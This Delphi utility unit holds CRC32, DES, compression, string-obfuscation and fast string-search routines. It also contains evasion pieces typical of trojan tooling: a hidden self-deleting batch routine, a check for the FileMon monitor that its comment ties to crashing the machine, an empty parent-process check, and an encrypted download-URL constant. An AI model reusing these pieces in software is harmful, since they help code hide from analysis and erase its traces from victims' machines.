unit MyUnits;

interface
uses
  WinProcs, SysUtils, Classes,  WinSock, TlHelp32,Zlib,Md5;
type
  TResultArray = array of string;
  TIPFileter = record
    IP: Integer;
    num: Integer;
  end;
const
  DownUrl='er8dymstPGoJVhkq/gzGOFHgB69VSDmlKcn4MwYVJJuWGJM3sCDQhFLQm1RZw2Hp';
  Table: array[0..255] of DWord =
  ($00000000, $77073096, $EE0E612C, $990951BA,
    $076DC419, $706AF48F, $E963A535, $9E6495A3,
    $0EDB8832, $79DCB8A4, $E0D5E91E, $97D2D988,
    $09B64C2B, $7EB17CBD, $E7B82D07, $90BF1D91,
    $1DB71064, $6AB020F2, $F3B97148, $84BE41DE,
    $1ADAD47D, $6DDDE4EB, $F4D4B551, $83D385C7,
    $136C9856, $646BA8C0, $FD62F97A, $8A65C9EC,
    $14015C4F, $63066CD9, $FA0F3D63, $8D080DF5,
    $3B6E20C8, $4C69105E, $D56041E4, $A2677172,
    $3C03E4D1, $4B04D447, $D20D85FD, $A50AB56B,
    $35B5A8FA, $42B2986C, $DBBBC9D6, $ACBCF940,
    $32D86CE3, $45DF5C75, $DCD60DCF, $ABD13D59,
    $26D930AC, $51DE003A, $C8D75180, $BFD06116,
    $21B4F4B5, $56B3C423, $CFBA9599, $B8BDA50F,
    $2802B89E, $5F058808, $C60CD9B2, $B10BE924,
    $2F6F7C87, $58684C11, $C1611DAB, $B6662D3D,
    $76DC4190, $01DB7106, $98D220BC, $EFD5102A,
    $71B18589, $06B6B51F, $9FBFE4A5, $E8B8D433,
    $7807C9A2, $0F00F934, $9609A88E, $E10E9818,
    $7F6A0DBB, $086D3D2D, $91646C97, $E6635C01,
    $6B6B51F4, $1C6C6162, $856530D8, $F262004E,
    $6C0695ED, $1B01A57B, $8208F4C1, $F50FC457,
    $65B0D9C6, $12B7E950, $8BBEB8EA, $FCB9887C,
    $62DD1DDF, $15DA2D49, $8CD37CF3, $FBD44C65,
    $4DB26158, $3AB551CE, $A3BC0074, $D4BB30E2,
    $4ADFA541, $3DD895D7, $A4D1C46D, $D3D6F4FB,
    $4369E96A, $346ED9FC, $AD678846, $DA60B8D0,
    $44042D73, $33031DE5, $AA0A4C5F, $DD0D7CC9,
    $5005713C, $270241AA, $BE0B1010, $C90C2086,
    $5768B525, $206F85B3, $B966D409, $CE61E49F,
    $5EDEF90E, $29D9C998, $B0D09822, $C7D7A8B4,
    $59B33D17, $2EB40D81, $B7BD5C3B, $C0BA6CAD,
    $EDB88320, $9ABFB3B6, $03B6E20C, $74B1D29A,
    $EAD54739, $9DD277AF, $04DB2615, $73DC1683,
    $E3630B12, $94643B84, $0D6D6A3E, $7A6A5AA8,
    $E40ECF0B, $9309FF9D, $0A00AE27, $7D079EB1,
    $F00F9344, $8708A3D2, $1E01F268, $6906C2FE,
    $F762575D, $806567CB, $196C3671, $6E6B06E7,
    $FED41B76, $89D32BE0, $10DA7A5A, $67DD4ACC,
    $F9B9DF6F, $8EBEEFF9, $17B7BE43, $60B08ED5,
    $D6D6A3E8, $A1D1937E, $38D8C2C4, $4FDFF252,
    $D1BB67F1, $A6BC5767, $3FB506DD, $48B2364B,
    $D80D2BDA, $AF0A1B4C, $36034AF6, $41047A60,
    $DF60EFC3, $A867DF55, $316E8EEF, $4669BE79,
    $CB61B38C, $BC66831A, $256FD2A0, $5268E236,
    $CC0C7795, $BB0B4703, $220216B9, $5505262F,
    $C5BA3BBE, $B2BD0B28, $2BB45A92, $5CB36A04,
    $C2D7FFA7, $B5D0CF31, $2CD99E8B, $5BDEAE1D,
    $9B64C2B0, $EC63F226, $756AA39C, $026D930A,
    $9C0906A9, $EB0E363F, $72076785, $05005713,
    $95BF4A82, $E2B87A14, $7BB12BAE, $0CB61B38,
    $92D28E9B, $E5D5BE0D, $7CDCEFB7, $0BDBDF21,
    $86D3D2D4, $F1D4E242, $68DDB3F8, $1FDA836E,
    $81BE16CD, $F6B9265B, $6FB077E1, $18B74777,
    $88085AE6, $FF0F6A70, $66063BCA, $11010B5C,
    $8F659EFF, $F862AE69, $616BFFD3, $166CCF45,
    $A00AE278, $D70DD2EE, $4E048354, $3903B3C2,
    $A7672661, $D06016F7, $4969474D, $3E6E77DB,
    $AED16A4A, $D9D65ADC, $40DF0B66, $37D83BF0,
    $A9BCAE53, $DEBB9EC5, $47B2CF7F, $30B5FFE9,
    $BDBDF21C, $CABAC28A, $53B39330, $24B4A3A6,
    $BAD03605, $CDD70693, $54DE5729, $23D967BF,
    $B3667A2E, $C4614AB8, $5D681B02, $2A6F2B94,
    $B40BBE37, $C30C8EA1, $5A05DF1B, $2D02EF8D);

  //通过域名得ip
function GetIPFromName(Name: string): string;
function LastPos(SubStr, s: string): string;
//检测是否别其他程序加载
procedure CheckParentProc;
//检测是否有filemon运行
function DetectFileMon: Boolean;
function SplitString(const Source, Ch: string): TResultArray;
function FastPosNoCase(const aSourceString, aFindString: string; const
  aSourceLen, aFindLen, StartPos: Integer): Integer;
function FastPos(const aSourceString, aFindString: string; const aSourceLen,
  aFindLen, StartPos: Integer): Integer;
procedure CalcCRC32(FileName: string; Len: Integer; var CRC32: DWord);
procedure DES(var Input; var Output; var Key; EnCrypt: Boolean);
function ReadStream(s: TStream; var Key; EnCrypt: Boolean): Boolean;
function QuickCRC32(data, crc: DWord): DWord;
function GetCrcFormStream(M:TStream;StartPos,EndPos:LongWord):LongWord;
function GetMd5FormStream(M:TStream;StartPos,EndPos:LongWord):String;

procedure CompressStream(var MyStream: TMemoryStream);
procedure UnCompressStream(var MyStream: TMemoryStream);
function EncryptNew(const InString:array of Byte;len:Integer; StartKey,MultKey,AddKey:Integer;Var OutBuf:Array of Byte): string;
function DecryptNew(const InString:array of Byte;len:Integer; StartKey,MultKey,AddKey:Integer;Var OutBuf:Array of Byte): string;
function SetByte(var buf:Array of Byte;Str:String):Boolean;
function ByteToString(Buf:Array of Byte):String;
implementation
var
CRC32Tab: array [0..255] of DWord;
//Len:文件最后len字节不校验
{*******************************************************
 * Standard Encryption algorithm - Copied from Borland *
 *******************************************************}
function EncryptNew(const InString:array of Byte;len:Integer; StartKey,MultKey,AddKey:Integer;Var OutBuf:Array of Byte): string;
var
  I : Byte;
begin
  Result := '';
  for I := 0 to Len-1 do
  begin
    OutBuf[i] := ((InString[I]) xor (StartKey shr 8));
    StartKey := (Byte(OutBuf[I]) + StartKey) * MultKey + AddKey;
  end;
end;
{*******************************************************
 * Standard Decryption algorithm - Copied from Borland *
 *******************************************************}
function DecryptNew(const InString:array of Byte;len:Integer; StartKey,MultKey,AddKey:Integer;Var OutBuf:Array of Byte): string;
var
  I : Byte;
begin
  Result := '';
  for I := 0 to Len-1 do
  begin
    OutBuf[i] :=(Byte(InString[I]) xor (StartKey shr 8));
    StartKey := (Byte(InString[I]) + StartKey) * MultKey + AddKey;
  end;
end;

function SetByte(var buf:Array of Byte;Str:String):Boolean;
var
  Len,Len1:Integer;
  i,j:Integer;
  code:Byte;

Begin
  Result:=False;
  Len:=Length(str);
  if High(buf)<2*Len+1 then  exit;
  Buf[0]:=Len;
  for i:=1 to Len do
  Begin
    code:=Ord(Str[i]);
    Randomize;
    Buf[2*i-1]:=Random(255) and $aa;
    Buf[2*i]:=Random(255) and $aa;
    code:=Code and $AA;
    Buf[2*i-1]:=Buf[2*i-1] or (code shr 1);
    Code:=Ord(Str[i]) and $55;
    Buf[2*i]:=Buf[2*i] or (code );
  End;
  Len1:=High(buf);
  For i:=2*Len+1+1 to Len1-1 do
  Begin
     Randomize;
     Buf[i]:=Random(255);
  End;

  Result:=True;
End;
function ByteToString(Buf:Array of Byte):String;
var
  Len,i:Integer;
  code:Byte;
Begin
  Len:=Buf[0];
  SetLength(Result,Len);
  For i:=1 to Len do
  Begin
    Code:=Buf[2*i-1] and $55;
    Code:=code shl 1;
    code:=Code or (Buf[2*i] and $55);
    Result[i]:=Chr(code);
  End;
End;
procedure UnCompressStream(var MyStream: TMemoryStream);
var
  SourceStream: TDecompressionStream;
  Buffer: PChar;
  Count: Integer;
Begin
  MyStream.Seek(0,0);
  MyStream.ReadBuffer(Count, SizeOf(Count));
  GetMem(Buffer, Count);
  SourceStream := TDecompressionStream.Create(MyStream);
  Try
    SourceStream.ReadBuffer(Buffer^, Count);
    MyStream.Clear;
    MyStream.WriteBuffer(Buffer^, Count);
    MyStream.Position := 0;
  finally
    FreeMem(Buffer);
  end;
end;
procedure CompressStream(var MyStream: TMemoryStream);
var
  SourceStream: TCompressionStream;
  DestStream: TMemoryStream;
  Count: Integer;
Begin
  Count := MyStream.Size;
  MyStream.Seek(0,0);
  DestStream := TMemoryStream.Create;
  SourceStream:=TCompressionStream.Create(clDefault, DestStream);
  Try
    MyStream.SaveToStream(SourceStream);
    SourceStream.Free;
    MYStream.Clear;
    MyStream.WriteBuffer(Count, SizeOf(Count));
    MyStream.CopyFrom(DestStream, 0);
    MyStream.Position := 0;
  finally
    DestStream.Free;
  end;
end;
function CalCRC32(data, crc, genpoly: DWord): DWord;
var
  i: Integer;
begin
  // 方法1：摘自XMODEM协议, 模仿CRC16计算方法, 但是低位先行
  crc := crc xor data;
  for i:=0 to 7 do
    if (crc and $01) <> 0 then // 只测试最低位
      crc := (crc shr 1) xor genpoly // 最低位为1，移位和异或处理
    else crc := crc shr 1;           // 否则只移位（除2）
  Result := crc;
end;
procedure InitCRC32Tab(genpoly: DWord);
var
  i: Integer;
begin
  for i:=0 to 255 do
    CRC32Tab[i] := CalCRC32(i,0,genpoly);
end;

function QuickCRC32(data, crc: DWord): DWord;
begin
  crc := CRC32Tab[Byte(crc xor data)] xor (crc shr 8);
  Result := crc;
end;
//从流中获得CRC校验值
function GetCrcFormStream(M:TStream;StartPos,EndPos:LongWord):LongWord;
var
  Buf:Array of Byte;
  Count:LongWord;
  i:Integer;
Begin
  if EndPos=0 then
     Count:=M.Size
  else
     Count:=EndPos-StartPos;
  SetLength(Buf,Count);
  M.Seek(StartPos,0);
  M.Read(BUf[0],Count);
  Result:=0;
  For i:=0 to Count-1 do
    Result:=QuickCRC32(Buf[i],Result);
End;
function GetMd5FormStream(M:TStream;StartPos,EndPos:LongWord):String;
var
  Buf:Array of Byte;
  Count:LongWord;
  i:Integer;
Begin
  if EndPos=0 then
     Count:=M.Size
  else
     Count:=EndPos-StartPos;
  SetLength(Buf,Count);
  M.Seek(StartPos,0);
  M.Read(BUf[0],Count);
  Result:=GetMD5(@Buf[0],Count);
End;
procedure CalcCRC32(FileName: string; Len: Integer; var CRC32: DWord);
var
  F: file;
  BytesRead: DWord;
  Buffer: array[1..65521] of Byte;
  i: Word;
begin
  FileMode := 0;
  CRC32 := $FFFFFFFF;
{$I-}
  AssignFile(F, FileName);
  Reset(F, 1);
  if IOResult = 0 then
  begin
    repeat
      BlockRead(F, Buffer, SizeOf(Buffer), BytesRead);
      if BytesRead <> 65521 then
      begin
        for i := 1 to BytesRead - Len do
          CRC32 := (CRC32 shr 8) xor Table[Buffer[i] xor (CRC32 and $000000FF)];
      end
      else
        for i := 1 to BytesRead do
          CRC32 := (CRC32 shr 8) xor Table[Buffer[i] xor (CRC32 and $000000FF)];

    until BytesRead = 0;
  end;
  CloseFile(F);
{$I+}
  CRC32 := not CRC32;
end;


//由域名得到ip

function GetIPFromName(Name: string): string;
var
  WSAData: TWSAData;
  hostEnt: PHostEnt;
begin
  WSAStartup(2, WSAData);
  hostEnt := gethostbyname(Pchar(Name));
  with hostEnt^ do
    Result := Format('%d.%d.%d.%d', [Byte(h_addr^[0]),
      Byte(h_addr^[1]), Byte(h_addr^[2]), Byte(h_addr^[3])]);
  WSACleanup;
end;

procedure DeleteMe; //程序自杀
var
  BatchFile: TextFile;
  BatchFileName: string;
  ProcessInfo: TProcessInformation;
  StartUpInfo: TStartupInfo;
begin
  {By Lovejingtao.http://Lovejingtao.126.com,Lovejingtao@21cn.com}
  BatchFileName := ExtractFilePath(ParamStr(0)) + '$$a.bat';
  AssignFile(BatchFile, BatchFileName);
  Rewrite(BatchFile);
  WriteLn(BatchFile, ':try');
  WriteLn(BatchFile, 'del "' + ParamStr(0) + '"');
  WriteLn(BatchFile,
    'if exist "' + ParamStr(0) + '"' + ' goto try');
  WriteLn(BatchFile, 'del "' + BatchFileName + '"');
  WriteLn(BatchFile, 'cls');
  CloseFile(BatchFile);
  Fillchar(StartUpInfo, SizeOf(StartUpInfo), $00);
  StartUpInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartUpInfo.wShowWindow := SW_HIDE;
  if CreateProcess(nil, Pchar(BatchFileName), nil, nil,
    False, IDLE_PRIORITY_CLASS, nil, nil, StartUpInfo,
    ProcessInfo) then
  begin
    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
  end;

end;

function LastPos(SubStr, s: string): string;
var
  Found, Len, Pos: Integer;
begin
  Pos := length(s);
  Len := length(SubStr);
  Found := 0;
  while (Pos > 0) and (Found = 0) do
  begin
    if Copy(s, Pos, Len) = SubStr then
      Found := Pos;
    Dec(Pos);
  end;
  LastPos := Copy(s, Found + 1, length(s) - Found);
end;

procedure CheckParentProc;
var //检查自己的进程的父进程
  Pn: TProcesseNtry32;
  sHandle: THandle;
  H, ExplProc, ParentProc: HWND;
  Found: Boolean;
  Buffer: array[0..1023] of Char;
  Path,path1: string;
  s, s1: string;
begin

end;


function DetectFileMon: Boolean;
begin
  if CreateFile(Pchar('\\.\FILEVXD'),
    GENERIC_READ or GENERIC_WRITE,
    FILE_SHARE_READ or FILE_SHARE_WRITE,
    nil,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    0) <> INVALID_HANDLE_VALUE then
    Result := True //如果有，就Down机！
  else
    Result := False;
end;

function SplitString(const Source, Ch: string): TResultArray;
var
  Temp: string;
  i: Integer;
begin
  Temp := Source;
  i := Pos(Ch, Source);
  setlength(Result, 0);
  while i <> 0 do
  begin
    setlength(Result, length(Result) + 1);
    Result[length(Result) - 1] := Copy(Temp, 0, i - 1);
    Delete(Temp, 1, i);
    i := Pos(Ch, Temp);
  end;
  setlength(Result, length(Result) + 1);
  Result[length(Result) - 1] := Temp;
end;

function FastPos(const aSourceString, aFindString: string; const aSourceLen,
  aFindLen, StartPos: Integer): Integer;
var
  SourceLen: Integer;
begin
  // Next, we determine how many bytes we need to
  // scan to find the "start" of aFindString.
  SourceLen := aSourceLen;
  SourceLen := SourceLen - aFindLen;
  if (StartPos - 1) > SourceLen then
  begin
    Result := 0;
    Exit;
  end;
  SourceLen := SourceLen - StartPos;
  SourceLen := SourceLen + 2;
  // The ASM starts here.
  asm
    // Delphi uses ESI, EDI, and EBX a lot,
    // so we must preserve them.
    push ESI
    push EDI
    push EBX
    // Get the address of sourceString[1]
    // and Add (StartPos-1).
    // We do this for the purpose of finding
    // the NEXT occurrence, rather than
    // always the first!
    mov EDI, aSourceString
    add EDI, StartPos
    Dec EDI
    // Get the address of aFindString.
    mov ESI, aFindString
    // Note how many bytes we need to
    // look through in aSourceString
    // to find aFindString.
    mov ECX, SourceLen
    // Get the first char of aFindString;
    // note how it is done outside of the
    // main loop, as it never changes!
    Mov  Al, [ESI]
    // Now the FindFirstCharacter loop!
    @ScaSB:
    // Get the value of the current
    // character in aSourceString.
    // This is equal to ah := EDI^, that
    // is what the [] are around [EDI].
    Mov  Ah, [EDI]
    // Compare this character with aDestString[1].
    cmp  Ah,Al
    // If they're not equal we don't
    // compare the strings.
    jne  @NextChar
    // If they're equal, obviously we do!
    @CompareStrings:
    // Put the length of aFindLen in EBX.
    mov  EBX, aFindLen
    // We DEC EBX to point to the end of
    // the string; that is, we don't want to
    // add 1 if aFindString is 1 in length!
    dec  EBX
    // add by ShengQuanhu
    // If EBX is zero, then we've successfully
    // compared each character; i.e. it's A MATCH!
    // It will be happened when aFindLen=1
    Jz @EndOfMatch
    //add end
//Here’s another optimization tip. People at this point usually PUSH ESI and
//so on and then POP ESI and so forth at the end–instead, I opted not to chan
//ge ESI and so on at all. This saves lots of pushing and popping!
    @CompareNext:
    // Get aFindString character +
    // aFindStringLength (the last char).
    mov  Al, [ESI+EBX]
    // Get aSourceString character (current
    // position + aFindStringLength).
    mov  Ah, [EDI+EBX]
    // Compare them.
    cmp  Al, Ah
    Jz   @Matches
    // If they don't match, we put the first char
    // of aFindString into Al again to continue
    // looking for the first character.
    Mov  Al, [ESI]
    Jmp  @NextChar
    @Matches:
    // If they match, we DEC EBX (point to
    // previous character to compare).
    Dec  EBX
    // If EBX <> 0 ("J"ump "N"ot "Z"ero), we
    // continue comparing strings.
    Jnz  @CompareNext
    //add by Shengquanhu
    @EndOfMatch:
    //add end
    // If EBX is zero, then we've successfully
    // compared each character; i.e. it's A MATCH!
    // Move the address of the *current*
    // character in EDI.
    // Note, we haven't altered EDI since
    // the first char was found.
    mov  EAX, EDI
    // This is an address, so subtract the
    // address of aSourceString[1] to get
    // an actual character position.
    sub  EAX, aSourceString
    // Inc EAX to make it 1-based,
    // rather than 0-based.
    inc  EAX
    // Put it into result.
    mov  Result, EAX
    // Finish this routine!
    jmp  @TheEnd
    @NextChar:
//This is where I jump to when I want to continue searching for the first char
//acter of aFindString in aSearchString:
    // Point EDI (aFindString[X]) to
    // the next character.
    Inc  EDI
    // Dec ECX tells us that we've checked
    // another character, and that we're
    // fast running out of string to check!
    dec  ECX
    // If EBX <> 0, then continue scanning
    // for the first character.
    jnz  @ScaSB
    // If EBX = 0, then move 0 into RESULT.
    mov  Result,0
    // Restore EBX, EDI, ESI for Delphi
    // to work correctly.
    // Note that they're POPped in the
    // opposite order they were PUSHed.
    @TheEnd:
    pop  EBX
    pop  EDI
    pop  ESI
  end;
end;

function FastPosNoCase(const aSourceString, aFindString: string; const
  aSourceLen, aFindLen, StartPos: Integer): Integer;
var
  SourceLen: Integer;
begin
  SourceLen := aSourceLen;
  SourceLen := SourceLen - aFindLen;
  if (StartPos - 1) > SourceLen then
  begin
    Result := 0;
    Exit;
  end;
  SourceLen := SourceLen - StartPos;
  SourceLen := SourceLen + 2;
  asm
    push ESI
    push EDI
    push EBX
    mov EDI, aSourceString
    add EDI, StartPos
    Dec EDI
    mov ESI, aFindString
    mov ECX, SourceLen
    Mov  Al, [ESI]
    // Make Al lowercase.
    and  Al, $df
    @ScaSB:
    Mov  Ah, [EDI]
    // Make Ah lowercase.
    and  Ah, $df
    cmp  Ah,Al
    jne  @NextChar
    @CompareStrings:
    mov  EBX, aFindLen
    dec  EBX
    //add by ShengQuanhu
    Jz   @EndOfMatch
    //add end
    @CompareNext:
    mov  Al, [ESI+EBX]
    mov  Ah, [EDI+EBX]
    // Make Al and Ah lowercase.
    and  Al, $df
    and  Ah, $df
    cmp  Al, Ah
    Jz   @Matches
    Mov  Al, [ESI]
    // Make Al lowercase.
    and  Al, $df
    Jmp  @NextChar
    @Matches:
    Dec  EBX
    Jnz  @CompareNext
    //add by Shengquanhu
    @EndOfMatch:
    //add end
    mov  EAX, EDI
    sub  EAX, aSourceString
    inc  EAX
    mov  Result, EAX
    jmp  @TheEnd
    @NextChar:
    Inc  EDI
    dec  ECX
    jnz  @ScaSB
    mov  Result,0
    @TheEnd:
    pop  EBX
    pop  EDI
    pop  ESI
  end;
end;

procedure DES(var Input; var Output; var Key; EnCrypt: Boolean);

const
  IP: array[1..64] of Byte = (58, 50, 42, 34, 26, 18, 10, 2,
    60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6,
    64, 56, 48, 40, 32, 24, 16, 8,
    57, 49, 41, 33, 25, 17, 9, 1,
    59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5,
    63, 55, 47, 39, 31, 23, 15, 7);
  InvIP: array[1..64] of Byte = (40, 8, 48, 16, 56, 24, 64, 32,
    39, 7, 47, 15, 55, 23, 63, 31,
    38, 6, 46, 14, 54, 22, 62, 30,
    37, 5, 45, 13, 53, 21, 61, 29,
    36, 4, 44, 12, 52, 20, 60, 28,
    35, 3, 43, 11, 51, 19, 59, 27,
    34, 2, 42, 10, 50, 18, 58, 26,
    33, 1, 41, 9, 49, 17, 57, 25);
  E: array[1..48] of Byte = (32, 1, 2, 3, 4, 5,
    4, 5, 6, 7, 8, 9,
    8, 9, 10, 11, 12, 13,
    12, 13, 14, 15, 16, 17,
    16, 17, 18, 19, 20, 21,
    20, 21, 22, 23, 24, 25,
    24, 25, 26, 27, 28, 29,
    28, 29, 30, 31, 32, 1);
  p: array[1..32] of Byte = (16, 7, 20, 21,
    29, 12, 28, 17,
    1, 15, 23, 26,
    5, 18, 31, 10,
    2, 8, 24, 14,
    32, 27, 3, 9,
    19, 13, 30, 6,
    22, 11, 4, 25);
  SBoxes: array[1..8, 0..3, 0..15] of Byte =
  (((14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7),
    (0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8),
    (4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0),
    (15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13)),

    ((15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10),
    (3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5),
    (0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15),
    (13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9)),

    ((10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8),
    (13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1),
    (13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7),
    (1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12)),

    ((7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15),
    (13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9),
    (10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4),
    (3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14)),

    ((2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9),
    (14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6),
    (4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14),
    (11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3)),

    ((12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11),
    (10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8),
    (9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6),
    (4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13)),

    ((4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1),
    (13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6),
    (1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2),
    (6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12)),

    ((13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7),
    (1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2),
    (7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8),
    (2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11)));

  PC_1: array[1..56] of Byte = (57, 49, 41, 33, 25, 17, 9,
    1, 58, 50, 42, 34, 26, 18,
    10, 2, 59, 51, 43, 35, 27,
    19, 11, 3, 60, 52, 44, 36,
    63, 55, 47, 39, 31, 23, 15,
    7, 62, 54, 46, 38, 30, 22,
    14, 6, 61, 53, 45, 37, 29,
    21, 13, 5, 28, 20, 12, 4);

  PC_2: array[1..48] of Byte = (14, 17, 11, 24, 1, 5,
    3, 28, 15, 6, 21, 10,
    23, 19, 12, 4, 26, 8,
    16, 7, 27, 20, 13, 2,
    41, 52, 31, 37, 47, 55,
    30, 40, 51, 45, 33, 48,
    44, 49, 39, 56, 34, 53,
    46, 42, 50, 36, 29, 32);

  ShiftTable: array[1..16] of Byte = (1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2,
    2, 1);

var
  InputValue: array[1..64] of Byte;
  OutputValue: array[1..64] of Byte;
  RoundKeys: array[1..16, 1..48] of Byte;
  l, r, FunctionResult: array[1..32] of Byte;
  c, d: array[1..28] of Byte;

  function GetBit(var data; Index: Byte): Byte;

  var
    Bits: array[0..7] of Byte absolute data;

  begin
    Dec(Index);
    if Bits[Index div 8] and (128 shr (Index mod 8)) > 0 then
      GetBit := 1
    else
      GetBit := 0;
  end; {GetBit}

  procedure SetBit(var data; Index, Value: Byte);

  var
    Bits: array[0..7] of Byte absolute data;
    Bit: Byte;

  begin
    Dec(Index);
    Bit := 128 shr (Index mod 8);
    case Value of
      0: Bits[Index div 8] := Bits[Index div 8] and (not Bit);
      1: Bits[Index div 8] := Bits[Index div 8] or Bit;
    end;
  end; {SetBit}

  procedure F(var FR, FK, Output);

  var
    r: array[1..48] of Byte absolute FR;
    k: array[1..48] of Byte absolute FK;
    Temp1: array[1..48] of Byte;
    Temp2: array[1..32] of Byte;
    n, H, i, j, row, Column: Integer;
    TotalOut: array[1..32] of Byte absolute Output;

  begin
    for n := 1 to 48 do
      Temp1[n] := r[E[n]] xor k[n];
    for n := 1 to 8 do
    begin
      i := (n - 1) * 6;
      j := (n - 1) * 4;
      row := Temp1[i + 1] * 2 + Temp1[i + 6];
      Column := Temp1[i + 2] * 8 + Temp1[i + 3] * 4 + Temp1[i + 4] * 2 + Temp1[i
        + 5];
      for H := 1 to 4 do
      begin
        case H of
          1: Temp2[j + H] := (SBoxes[n, row, Column] and 8) div 8;
          2: Temp2[j + H] := (SBoxes[n, row, Column] and 4) div 4;
          3: Temp2[j + H] := (SBoxes[n, row, Column] and 2) div 2;
          4: Temp2[j + H] := (SBoxes[n, row, Column] and 1);
        end;
      end;
    end;
    for n := 1 to 32 do
      TotalOut[n] := Temp2[p[n]];
  end; {F}

  procedure Shift(var SubKeyPart);

  var
    SKP: array[1..28] of Byte absolute SubKeyPart;
    n, b: Byte;

  begin
    b := SKP[1];
    for n := 1 to 27 do
      SKP[n] := SKP[n + 1];
    SKP[28] := b;
  end; {Shift}

  procedure SubKey(Round: Byte; var SubKey);

  var
    SK: array[1..48] of Byte absolute SubKey;
    n, b: Byte;

  begin
    for n := 1 to ShiftTable[Round] do
    begin
      Shift(c);
      Shift(d);
    end;
    for n := 1 to 48 do
    begin
      b := PC_2[n];
      if b <= 28 then
        SK[n] := c[b]
      else
        SK[n] := d[b - 28];
    end;
  end; {SubKey}

var
  n, i, b, Round: Byte;
  Outputje: array[1..64] of Byte;
  k: array[1..48] of Byte;
  fi: Text;

begin
  for n := 1 to 64 do
    InputValue[n] := GetBit(Input, n);
  for n := 1 to 28 do
  begin
    c[n] := GetBit(Key, PC_1[n]);
    d[n] := GetBit(Key, PC_1[n + 28]);
  end;
  for n := 1 to 16 do
    SubKey(n, RoundKeys[n]);
  for n := 1 to 64 do
    if n <= 32 then
      l[n] := InputValue[IP[n]]
    else
      r[n - 32] := InputValue[IP[n]];
  for Round := 1 to 16 do
  begin
    if EnCrypt then
      F(r, RoundKeys[Round], FunctionResult)
    else
      F(r, RoundKeys[17 - Round], FunctionResult);
    for n := 1 to 32 do
      FunctionResult[n] := FunctionResult[n] xor l[n];
    l := r;
    r := FunctionResult;
  end;
  for n := 1 to 64 do
  begin
    b := InvIP[n];
    if b <= 32 then
      OutputValue[n] := r[b]
    else
      OutputValue[n] := l[b - 32];
  end;
  for n := 1 to 64 do
    SetBit(Output, n, OutputValue[n]);
end;

function ReadStream(s: TStream; var Key; EnCrypt: Boolean): Boolean;
var
  Input, Output: array[0..7] of Byte;
  ReadCount, seekCount: Integer;
begin
  Result := False;
  try
    s.Seek(0, 0);
    ReadCount := s.Read(Input, 8);
    while (ReadCount = 8) do
    begin
      DES(Input, Output, Key, EnCrypt);
      s.Seek(-8, 1);
      s.Write(Output, 8);
      ReadCount := s.Read(Input, 8);
    end;
    Result := True;
  finally
    s.Seek(0, 0);
  end;

end;
initialization
Begin
 InitCRC32Tab($EFB8832D);
End;
end.
